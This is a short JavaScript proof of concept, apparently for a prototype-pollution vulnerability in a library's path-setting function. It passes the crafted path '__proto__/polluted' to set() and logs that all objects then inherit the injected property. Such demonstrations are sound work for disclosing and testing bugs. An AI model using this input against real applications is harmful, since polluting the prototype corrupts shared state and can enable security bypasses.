const sep = require('../src');

console.log({}.polluted);
sep.set({}, "__proto__/polluted", "Polluted!");
console.log({}.polluted);